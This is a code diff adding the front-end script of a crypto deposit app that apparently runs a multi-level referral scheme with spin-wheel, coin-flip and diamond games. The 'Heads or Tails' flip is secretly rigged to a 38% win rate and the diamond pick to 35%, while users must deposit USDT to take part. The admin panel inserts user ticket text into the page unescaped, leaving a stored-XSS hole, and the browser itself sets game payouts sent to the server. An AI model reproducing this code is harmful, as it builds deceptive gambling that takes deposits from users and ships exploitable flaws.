+  el("ad-mem").innerHTML="<b>Members</b><table style='width:100%'><tr><th>User</th><th>Email</th><th>Wallet</th><th>Lv</th><th>Withdraw 0x</th></tr>"+mem+"</table>";
+  var sup=el("ad-sup");
+if(sup){
+  var html="<div class='font-bold mb-2'>SUPPORT</div>";
+  allUsers().forEach(function(p){
+    (p.tickets||[]).forEach(function(t,i){
+      if(t.reply)return;
+      html+="<div class='border-b border-white/10 py-2'>"+p.user+": "+t.msg+"<br><input id='rp-"+p.user+"-"+i+"' placeholder='Reply'><button class='btn px-3 py-1' onclick='replyTicket(\""+p.user+"\","+i+")'>Send</button></div>";
+    });
+  });
+  sup.innerHTML=html;
+  var vfN=(vfH.match(/\$25/g)||[]).length;
+var supN=(html.match(/border-b/g)||[]).length;
+window._adCount={vf:vfN,deps:pd,wds:pw,sup:supN};
+adBadge("vf",vfN); adBadge("deps",pd); adBadge("wds",pw); adBadge("sup",supN);
+}
+}
+  function replyTicket(name,i){
+  var p=load(name); if(!p||!p.tickets||!p.tickets[i])return;
+  var v=el("rp-"+name+"-"+i).value.trim(); if(!v)return;
+  p.tickets[i].reply=v; p.tickets[i].st="REPLIED";
+  saveU(p);
+  pop("Sent","Reply saved");
+  renderAdmin();
+}
+  function adTab(id){
+  ["vf","deps","wds","sup","mem"].forEach(function(x){
+    var e=el("ad-"+x); if(e)e.classList.toggle("hidden",x!==id);
+  });
+  var seen=JSON.parse(localStorage.getItem("adSeen")||"{}");
+  seen[id]=window._adCount&&window._adCount[id]||0;
+  localStorage.setItem("adSeen",JSON.stringify(seen));
+  var b=el("bd-"+id); if(b)b.style.display="none";
+}
+function adBadge(id,n){
+  var seen=JSON.parse(localStorage.getItem("adSeen")||"{}");
+  var b=el("bd-"+id); if(!b)return;
+  var left=n-(seen[id]||0);
+  if(left>0){b.textContent=left;b.style.display="inline";}
+  else b.style.display="none";
+}
+ function levelOf(L){
+  var A=L.A.filter(isOn).length;
+  var down=L.B.concat(L.C||[],L.D||[]).filter(isOn).length;
+  var tot=A+down;
+  var wal=Number((u&&(u.bal||u.lock))||0),lv=1;
+  SLABS.forEach(function(s){
+    if(wal>=s.need&&A>=s.dir&&down>=s.down&&tot>=s.tot)lv=s.n;
+  });
+  return lv;
+}
+  function giftBox(lv,g){
+  var old=document.getElementById("gift-box");
+  if(old)old.remove();
+  var d=document.createElement("div");
+  d.id="gift-box";
+  d.style.cssText="position:fixed;inset:0;background:rgba(7,20,40,.55);z-index:80;display:flex;align-items:center;justify-content:center;padding:18px";
+  d.innerHTML='<div style="background:#fff;border-radius:24px;padding:22px 18px;text-align:center;width:min(360px,100%);box-shadow:0 20px 50px rgba(0,0,0,.2)"><div style="font-size:54px">🎁</div><div style="font-weight:800;font-size:22px;margin-top:8px">Congratulations<br>Level '+lv+'</div><div style="color:#1a73e8;font-weight:800;font-size:28px;margin:8px 0">$'+g+' gift</div><div style="color:#3d4f66;font-size:14px">Added to your wallet</div><button id="gift-ok" style="margin-top:14px;background:#1d4ed8;color:#fff;border:0;border-radius:14px;padding:12px 22px;font-weight:800">Claim</button></div>';
+  document.body.appendChild(d);
+  document.getElementById("gift-ok").onclick=function(){d.remove();if(typeof draw==="function")draw();};
+}
+function applyLevel(L){
+  if(!u)return;
+  if(!(u.lock>=45)){u.level=0;return;}
+  var lv=levelOf(L)||1;
+  u.level=lv;
+  saveU(u);
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/level",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+    body:JSON.stringify({user:u.user})
+  }).then(function(r){return r.json()}).then(function(d){
+    if(!d||!d.ok)return;
+    u.level=d.level;u.bal=d.bal;u.profit=d.profit;u.paidLevels=d.paidLevels||u.paidLevels;
+    saveU(u);
+    if(d.added>0)giftBox(d.level,d.added);
+    draw();
+  }).catch(function(){});
+}
+function drawWheel(){
+  var w=el("wheel");if(!w)return;
+  var stops=[];
+  SLICES.forEach(function(s,i){stops.push(s.c+" "+(i*60)+"deg "+((i+1)*60)+"deg");});
+  w.innerHTML="";
+  w.style.background="conic-gradient("+stops.join(",")+")";
+  SLICES.forEach(function(s,i){
+    var ang=i*60+30;
+    var lab=document.createElement("div");
+    lab.style.cssText="position:absolute;left:50%;top:50%;width:56px;margin-left:-28px;text-align:center;color:#fff;font-size:11px;font-weight:800;text-shadow:0 1px 3px #000;transform:rotate("+ang+"deg) translateY(-92px) rotate("+(-ang)+"deg)";
+    lab.textContent=s.l;
+    w.appendChild(lab);
+  });
+}
+function doSpin(){
+  if(!u||!u.verified){showVerify();return}
+  if(window._spinning)return;
+  function tone(f,ms,type){try{var a=new(window.AudioContext||window.webkitAudioContext)(),o=a.createOscillator(),g=a.createGain();o.type=type||"square";o.frequency.value=f;g.gain.value=0.08;o.connect(g);g.connect(a.destination);o.start();setTimeout(function(){o.stop();a.close();},ms||120);}catch(e){}}
+    if(!u||u.lock<45){pop("Deposit first","Minimum $45 USDT BEP20 deposit is required before you can spin.");return}
+  if(u.spinUsedDay!==dayKey()){u.spinUsed=0;u.spinUsedDay=dayKey();u.nextSpin=0;}
+var needNow=spinNeed(u);
+var leftNow=needNow-Number(u.spinUsed||0);
+if(leftNow<=0){
+  pop("Spins used","Today's spins are finished.");
+  return;
+}
+u.spins=leftNow;
+    if(typeof layers==="function"&&typeof levelOf==="function"){
+    u.level=levelOf(layers())||1;
+  }
+  var need=((u.level||1)>=2)?({2:2,3:3,4:4,5:5}[u.level]||2):1;
+    if((u.spins||0)>need){u.spins=need;saveU(u);}
+  if(u.spins<=0){
+    var left=Math.max(0,(u.nextSpin||0)-Date.now());
+    var hh=Math.floor(left/3600000),mm=Math.floor((left%3600000)/60000),ss=Math.floor((left%60000)/1000);
+    pop("Spin locked","Next spin in "+hh+"h "+mm+"m "+ss+"s");
+    return;
+  }
+u.spins-=1;u.spinUsed=Number(u.spinUsed||0)+1;u.spinUsedDay=dayKey();u.packUsed=true;
+u.spinDay=new Date().toISOString().slice(0,10);
+  if((u.spins||0)<=0)u.nextSpin=Date.now()+86400000;else u.nextSpin=0;
+  saveU(u);
+  if(el("sp-left"))el("sp-left").textContent=u.spins;
+  window._spinning=true;
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/Spin",{
+  method:"POST",
+  headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+  body:JSON.stringify({user:u.user,m:1.02})
+}).then(function(r){return r.json()}).then(function(d){
+if(d&&d.bal!=null){u.bal=d.bal;u.profit=d.profit;u.todayN=d.todayN;u._spinAdd=d.add||0;saveU(u);}
+}).catch(function(){});
+  if(el("sp-res"))el("sp-res").textContent="Spinning...";
+  var actx=new (window.AudioContext||window.webkitAudioContext)();
+  if(actx.resume)actx.resume();
+var osc=actx.createOscillator(),gain=actx.createGain();
+osc.type="sawtooth";
+osc.frequency.setValueAtTime(180,actx.currentTime);
+osc.frequency.linearRampToValueAtTime(900,actx.currentTime+10);
+gain.gain.setValueAtTime(0.35,actx.currentTime);
+gain.gain.linearRampToValueAtTime(0.02,actx.currentTime+10);
+osc.connect(gain);gain.connect(actx.destination);
+osc.start();
+osc.stop(actx.currentTime+10);
+var tick=setInterval(function(){},11000);
+  var nw=SLICES.findIndex(function(x){return x.m===0});
+  var pay=[];SLICES.forEach(function(x,n){if(x.m>0)pay.push(n)});
+  var i,lv=Number(u.level||1);
+var hit10=lv>=5?1:lv>=4?1:lv>=3?1:lv>=2?1:6;
+if(Math.random()<0.18&&nw>=0)i=nw;
+else if(Math.random()<hit10/30){
+  i=SLICES.findIndex(function(x){return x.m>=1.10;});
+  if(i<0)i=pay[0];
+}else{
+  var bag=[];
+  SLICES.forEach(function(x,n){
+    if(!(x.m>0)||x.m>=1.10)return;
+    var w=x.m>=1.08?(lv>=2?2:8):x.m>=1.06?20:x.m>=1.04?36:50;
+    for(var k=0;k<w;k++)bag.push(n);
+  });
+  i=bag[Math.floor(Math.random()*bag.length)];
+}
+  var s=SLICES[i],w=el("wheel");
+  if(w){w.style.transition="none";w.style.transform="rotate(0deg)";void w.offsetWidth;w.style.transition="transform 11s cubic-bezier(.12,.7,.12,1)";w.style.transform="rotate("+(360*6+i*-60-30)+"deg)";}
+  setTimeout(function(){
+    clearInterval(tick);
+    try{var c=actx.createOscillator(),g=actx.createGain();c.type="sine";c.frequency.value=784;g.gain.setValueAtTime(0.25,actx.currentTime);g.gain.exponentialRampToValueAtTime(0.01,actx.currentTime+0.8);c.connect(g);g.connect(actx.destination);c.start();c.stop(actx.currentTime+0.8);}catch(e){}
+    var msg;
+    
+  
+      
+    
+    if(el("sp-res"))el("sp-res").textContent="";
+    pullCloud(function(){
+  var nu=load(u.user);
+  if(nu)u=nu;
+  draw();
+  if(el("h-bal"))el("h-bal").textContent=money(u.bal);
+  if(el("h-profit"))el("h-profit").textContent=money(u.profit);
+  if(el("inc-today"))el("inc-today").textContent=money(u.todayN||0);
+  pop("Profit","$"+money(u._spinAdd||0)+" added");
+  window._spinning=false;
+});
+  },11000);
+}
+  var nf={on:0,stake:0,mult:1,n:0};
+function nfTone(f,ms,type){
+  try{
+    var A=window.AudioContext||window.webkitAudioContext;
+    if(!A)return;
+    var c=new A(),o=c.createOscillator(),g=c.createGain();
+    o.type=type||"sine";o.frequency.value=f;g.gain.value=0.08;
+    o.connect(g);g.connect(c.destination);o.start();
+    setTimeout(function(){try{o.stop();c.close();}catch(e){}},ms||120);
+  }catch(e){}
+}
+function nfDay(){
+  var d=new Date().toDateString();
+  if(u.nfDay!==d){u.nfDay=d;u.nfN=0;}
+  return 30-(u.nfN||0);
+}
+function nfShow(){
+  if(el("nf-mult"))el("nf-mult").textContent=(nf.mult||1).toFixed(2)+"x";
+  var p=nf.on?+(nf.stake*nf.mult-nf.stake).toFixed(2):0;
+  if(el("nf-profit"))el("nf-profit").textContent="Profit $"+p.toFixed(2);
+  if(el("nf-cash")){
+    if(nf.on&&nf.mult>1)el("nf-cash").classList.remove("hidden");
+    else el("nf-cash").classList.add("hidden");
+  }
+  if(el("nf-bet"))el("nf-bet").textContent=nf.on?"Bet live":"Place bet";
+}
+function nfBet(){
+  if(!u){pop("Login","Sign in");return;}
+  if(nf.on){pop("Live","Flip Heads or Tails");return;}
+  var amt=Number(el("nf-amt").value||0);
+  var can=Math.max(0,Number(u.bal||0));
+  if(amt<5){pop("Min","Minimum $5");return;}
+  if(amt>can){pop("Balance","Not enough wallet");return;}
+  if(nfDay()<=0){pop("Limit","30 rounds today");return;}
+  u.nfN=(u.nfN||0)+1;
+  nf={on:1,stake:amt,mult:1,n:0};
+  nfTone(180,40,"square");
+  setTimeout(function(){nfTone(320,50,"square");},70);
+  setTimeout(function(){nfTone(520,80,"triangle");},160);
+  setTimeout(function(){nfTone(780,120,"sine");},260);
+  pop("Bet","$"+amt+" live · pick Heads or Tails");
+  saveU(u);draw();nfShow();
+}
+function nfFlip(side){
+  if(!u){pop("Login","Sign in");return;}
+  if(!nf.on){pop("Bet first","Place bet then flip");return;}
+  var win=Math.random()<0.38;
+  var land=win?side:(side==="H"?"T":"H");
+  var ring=el("nf-ring");
+  if(ring){
+    ring.style.transition="transform .7s cubic-bezier(.2,.8,.2,1),background .2s,border-color .2s";
+    ring.style.transform="rotate("+(720+Math.random()*360)+"deg)";
+    setTimeout(function(){
+      ring.style.borderColor=land==="H"?"#f5a623":"#2563eb";
+      ring.style.background=land==="H"?"#fde68a":"#1e3a8a";
+    },700);
+  }
+  u.nfH=u.nfH||[];u.nfH.unshift(win?1:0);u.nfH=u.nfH.slice(0,12);
+  if(el("nf-hist"))el("nf-hist").innerHTML=u.nfH.map(function(x){
+    return '<i style="display:inline-block;width:10px;height:10px;border-radius:2px;background:'+(x?"#f5a623":"#cbd5e1")+'"></i>';
+  }).join("");
+  if(!win){
+    fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/game",{
+      method:"POST",
+      headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+      body:JSON.stringify({user:u.user,delta:-nf.stake,income:0})
+    }).then(function(r){return r.json()}).then(function(d){
+      if(d&&d.bal!=null){u.bal=d.bal;u.profit=d.profit;saveU(u);draw();}
+      pop("Lose",land+" · stake gone");
+      nf={on:0,stake:0,mult:1,n:0};nfShow();
+    });
+    return;
+  }
+  nf.n++;nf.mult=Math.min(100,+(1.25+(nf.n-1)*0.25).toFixed(2));
+  pop("Congratulations",land==="H"?"Heads · "+nf.mult.toFixed(2)+"x":"Tails · "+nf.mult.toFixed(2)+"x");
+  saveU(u);nfShow();
+}
+function nfCash(){
+  if(!nf.on||nf.mult<=1)return;
+  var get=+(nf.stake*nf.mult).toFixed(2);
+  var income=+(get-nf.stake).toFixed(2);
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/game",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+    body:JSON.stringify({user:u.user,delta:income,income:income})
+  }).then(function(r){return r.json()}).then(function(d){
+    if(d&&d.bal!=null){u.bal=d.bal;u.profit=d.profit;u.todayN=d.todayN;saveU(u);draw();}
+    pop("Cash out","+$"+get);
+    nf={on:0,stake:0,mult:1,n:0};nfShow();
+  });
+  }
+var gzBusy=0,gzAmt=0,gzOpen=0;
+function gzStart(){
+  if(!u){pop("Login","Sign in");return;}
+  var inp=el("gz-amt");
+  var amt=Number((inp&&inp.value)||0);
+  if(amt<10){pop("Min","Minimum $10");return;}
+  if(amt>Number(u.bal||0)){pop("Balance","Not enough wallet");return;}
+  gzBusy=1;gzOpen=1;gzAmt=amt;
+  
+  var msg=el("gz-msg");
+  if(msg)msg.textContent="Tap one diamond";
+}
+function gzPick(btn){
+  if(!gzOpen)return;
+  gzOpen=0;
+  var win=Math.random()<0.35;
+  var msg=el("gz-msg");
+  btn.style.color=win?"#ca8a04":"#94a3b8";
+  var delta=win?+(gzAmt*1.55-gzAmt).toFixed(2):-gzAmt;
+  var income=win?delta:0;
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/game",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+    body:JSON.stringify({user:u.user,delta:delta,income:income})
+  }).then(function(r){return r.json()}).then(function(d){
+    if(!d||d.error){pop("Game",d&&d.error||"not saved");return}
+    u.bal=d.bal;u.profit=d.profit;u.todayN=d.todayN;u.todayD=dayKey();
+    saveU(u);draw();
+    if(win){if(msg)msg.textContent="Win $"+(gzAmt*1.55).toFixed(2);pop("Congratulations","+$"+income);}
+    else{if(msg)msg.textContent="Empty · -$"+gzAmt;pop("Diamond","No win · stake gone");}
+  }).catch(function(){pop("Game","not saved");});
+  gzBusy=0;gzAmt=0;
+}
+function draw(){
+  if(!u)return;
+  var dk="depseen_"+u.user, seen=JSON.parse(localStorage.getItem(dk)||"null");
+var ok=(u.deps||[]).filter(function(d){return d.st==="SUCCESSFUL";});
+if(!seen){localStorage.setItem(dk,JSON.stringify(ok.map(function(d){return d.id})));}
+else{ok.forEach(function(d){if(seen.indexOf(d.id)<0){seen.push(d.id);pop("Approved","$"+d.amt+" added");}});localStorage.setItem(dk,JSON.stringify(seen));}
+    try{nfShow();}catch(e){}
+  if(el("p-box"))el("p-box").innerHTML="<div class='serif text-3xl mb-3'>Profile</div><div class='leading-8 text-sm'>User <b>"+(u.user||"—")+"</b><br>Email "+(u.email||"—")+"<br>Code <b>"+(u.ref||"—")+"</b><br>Sponsor "+(u.sponsor||"—")+"<br>Level "+(u.level||1)+"<br>Wallet $"+money(u.bal)+"<br>Lock $"+money(u.lock)+"</div>";
+  if(el("h-name"))el("h-name").textContent=u.user||"";
+      var L=layers(); applyLevel(L);
+  resetDailySpin(u);
+    var need=spinNeed(u);
+if(u.spinUsedDay!==dayKey()){u.spinUsed=0;u.spinUsedDay=dayKey();u.nextSpin=0;}
+if(Number(u.spinUsed||0)>=spinNeed(u)){
+  u.spins=0;
+}else{
+  if(u.spinUsedDay!==dayKey()){u.spinUsed=0;u.spinUsedDay=dayKey();}
+  var left=need-Number(u.spinUsed||0);
+  if(left<0)left=0;
+  u.spins=left;
+}
+saveU(u);
+    
+  if(el("h-lv"))el("h-lv").textContent=u.level||0;
+  if(el("dep-addr"))el("dep-addr").textContent=ADDR;
+  if(el("h-bal"))el("h-bal").textContent=money(u.bal);
+      if(el("wd-addr")&&u.addr){el("wd-addr").value=u.addr;el("wd-addr").disabled=!addrEdit;}
+  if(el("h-name"))el("h-name").textContent=u.user;
+if(el("w-bal"))el("w-bal").textContent=money(u.bal);
+  el("h-profit").textContent=money(u.profit); if(el("w-free"))el("w-free").textContent=money(u.profit);
+  if(el("slab-home"))el("slab-home").innerHTML=slabHtml();
+if(el("slab-team")){
+  var s=slabNow();
+  el("slab-team").innerHTML="Active slab · <b>"+s.name+"</b> · $"+s.need;
+}
+      if(u.todayD!==dayKey()){
+  u.todayD=dayKey();
+  u.todayN=0;u.dRew=0;u.dDia=0;u.dTeam=0;
+  u.lastRew=+u.rewardInc||0;
+  u.lastDia=+u.diamondInc||0;
+  u.lastTeam=+u.teamInc||0;
+  saveU(u);
+}
+var nr=+u.rewardInc||0, nd=+u.diamondInc||0, nt=+u.teamInc||0;
+if(u.lastRew==null)u.lastRew=nr;
+if(u.lastDia==null)u.lastDia=nd;
+if(u.lastTeam==null)u.lastTeam=nt;
+if(nr>u.lastRew){u.dRew=(+u.dRew||0)+(nr-u.lastRew);u.lastRew=nr;}
+if(nd>u.lastDia){u.dDia=(+u.dDia||0)+(nd-u.lastDia);u.lastDia=nd;}
+if(nt>u.lastTeam){u.dTeam=(+u.dTeam||0)+(nt-u.lastTeam);u.lastTeam=nt;}
+    if(el("inc-today"))el("inc-today").textContent=money(u.todayN||0);
+if(el("inc-rew"))el("inc-rew").textContent=money(u.dRew||0);
+if(el("inc-dia"))el("inc-dia").textContent=money(u.dDia||0);
+if(el("inc-team"))el("inc-team").textContent=money(u.dTeam||0);
+  applyVol(u,true);
+paintVol();
+if(el("inc-today"))el("inc-today").textContent=money(u.todayN||0);
+if(el("inc-rew"))el("inc-rew").textContent=money(u.dRew||0);
+if(el("inc-dia"))el("inc-dia").textContent=money(u.dDia||0);
+ el("h-lv").textContent=u.level; if(el("h-lvn"))el("h-lvn").textContent=L.A.length+" in A-team";
+  el("nA").textContent=L.A.length; el("nB").textContent=L.B.length; el("nC").textContent=L.C.length; el("nD").textContent=L.D.length;
+  el("tA").textContent=L.A.length; el("tB").textContent=L.B.length; el("tC").textContent=L.C.length; el("tD").textContent=L.D.length;
+  el("h-code").textContent=u.ref; el("h-link").textContent=location.origin+location.pathname+"?ref="+u.ref;
+  el("sp-left").textContent=u.spins; if(el("wd-saved"))el("wd-saved").textContent=u.addr?"Address saved":"No address yet";
+  if(el("sp-next")){
+  if(u.nextSpin&&Date.now()<u.nextSpin){
+    var s=Math.ceil((u.nextSpin-Date.now())/1000),h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sec=s%60;
+    el("sp-next").textContent="Next spin in "+h+"h "+m+"m "+sec+"s";
+  }else{
+    el("sp-next").textContent=u.spins>0?"Spin ready":"—";
+  }
+}
+  u.deps=(u.deps||[]).filter(function(d){return d.st==="PENDING"||(d.t&&(Date.now()-d.t)<300000);});
+  el("dep-hist").innerHTML=u.deps.map(function(d){return '<div class="py-2">$'+money(d.amt)+' · '+d.st+'</div>'}).join("");
+    function wdWhen(t){
+    if(!t)return "—";
+    var d=new Date(t);
+    var mon=["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"][d.getMonth()];
+    var h=d.getHours(),m=d.getMinutes(),ampm=h>=12?"PM":"AM";
+    h=h%12;if(!h)h=12;
+    var mm=(m<10?"0":"")+m;
+    return d.getDate()+" "+mon+" "+d.getFullYear()+", "+h+":"+mm+" "+ampm;
+  }
+          var wdRows=(u.wds||[]).map(function(d){
+      var req=d.req!=null?d.req:+Number(d.amt||0);
+      var got=d.amt;
+      var fee=d.fee!=null?d.fee:+((Number(req)-Number(got||0)).toFixed(2));
+      return '<div class="py-3 border-b"><div>'+wdWhen(d.t)+' · '+(d.st||'')+'</div><div>Requested $'+money(req)+'</div><div>Fee $'+money(fee)+'</div><div>Received $'+money(got)+'</div></div>';
+    }).join("")||'<div class="text-slate-500">No withdraws</div>';
+  if(el("wd-hist"))el("wd-hist").innerHTML=wdRows;
+  if(el("wd-hist-box"))el("wd-hist-box").innerHTML=wdRows;
+  el("t-plan").innerHTML="<b>Direct A</b> — 10% of first deposit.<br><b>Level 2</b> Wallet $200 · A 18 · Down 17 · Total 35<br><b>Level 3</b> Wallet $500 · A 30 · Down 65 · Total 95<br><b>Level 4</b> Wallet $1000 · A 50 · Down 175 · Total 225<br><b>Level 5</b> Wallet $2000 · A 50 · Down 500 · Total 550";
+  var all=L.A.concat(L.B,L.C,L.D),act=all.filter(isOn),off=all.filter(function(p){return !isOn(p)});if(el("nTot"))el("nTot").textContent=act.length;if(el("nAct"))el("nAct").textContent=act.length;if(el("nIna"))el("nIna").textContent=off.length;el("nA").textContent=L.A.filter(isOn).length;el("nB").textContent=L.B.filter(isOn).length;el("nC").textContent=L.C.filter(isOn).length;el("nD").textContent=L.D.filter(isOn).length;el("tA").textContent=L.A.filter(isOn).length;el("tB").textContent=L.B.filter(isOn).length;el("tC").textContent=L.C.filter(isOn).length;el("tD").textContent=L.D.filter(isOn).length;if(el("t-list"))el("t-list").innerHTML="<b>A</b> "+L.A.filter(isOn).map(function(p){return maskName(p.user)}).join(", ")+"<br><b>B</b> "+L.B.filter(isOn).map(function(p){return maskName(p.user)}).join(", ")+"<br><b>C</b> "+L.C.filter(isOn).map(function(p){return maskName(p.user)}).join(", ")+"<br><b>D</b> "+L.D.filter(isOn).map(function(p){return maskName(p.user)}).join(", ");
+  if(el("t-list"))el("t-list").innerHTML="";
 
+}
+  setInterval(function(){
+  if(!u||!el("sp-next"))return;
+  if(u.nextSpin&&Date.now()<u.nextSpin){
+    var s=Math.max(0,Math.ceil((u.nextSpin-Date.now())/1000));
+    var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sec=s%60;
+    el("sp-next").textContent="Next spin in "+h+"h "+m+"m "+sec+"s";
+    el("sp-next").style.opacity="0.99";
+void el("sp-next").offsetHeight;
+el("sp-next").style.opacity="1";
+  }
+},250);
+  (function tickClock(){
+  try{
+    if(u&&el("sp-next")&&u.nextSpin&&Date.now()<u.nextSpin){
+      var s=Math.max(0,Math.ceil((u.nextSpin-Date.now())/1000));
+      el("sp-next").textContent="Next spin in "+Math.floor(s/3600)+"h "+Math.floor((s%3600)/60)+"m "+(s%60)+"s";
+    }
+  }catch(e){}
+  requestAnimationFrame(tickClock);
+})();
+  
+window.addEventListener("load",function(){
+  var sess=localStorage.getItem("nivo_session");
+  if(sess){
+    hideAll();
+    if(el("app"))el("app").classList.remove("hidden");
+    pullCloud(function(){
+      var su=load(sess);
+      if(su&&su.user){u=su;enterUser();}
+      else{hideAll();el("auth").classList.remove("hidden");showBox("box-login");}
+    });
+    return;
+  }
+  var q=(new URLSearchParams(location.search).get("ref")||"");
+  if(q)localStorage.setItem("nivo_ref",q);
+  var r=q||localStorage.getItem("nivo_ref")||"";
+  if(r){
+    showBox("box-signup");
+    if(el("su-ref"))el("su-ref").value=r;
+  }
+  if(location.hash==="#admin")showBox("box-admin");
+});
+  function spinNeed(uu){var lv=Number((uu&&uu.level)||1);if(lv<1)lv=1;if(lv>5)lv=5;return lv;}
+function resetDailySpin(uu){
+  if(!uu||!(uu.lock>=45))return;
+  var d=new Date().toISOString().slice(0,10);
+  if(uu.nextSpin&&Date.now()<uu.nextSpin&&(uu.spins||0)<=0){return;}
+  if((uu.spins||0)<spinNeed(uu))uu.spins=spinNeed(uu);
+  if(uu.spinGot===d)return;
+  uu.spinGot=d;
+  uu.spinDay=d;
+  uu.spins=spinNeed(uu);
+  uu.nextSpin=0;
+  saveU(uu);
+}
+</script>
+</body>
+</html>
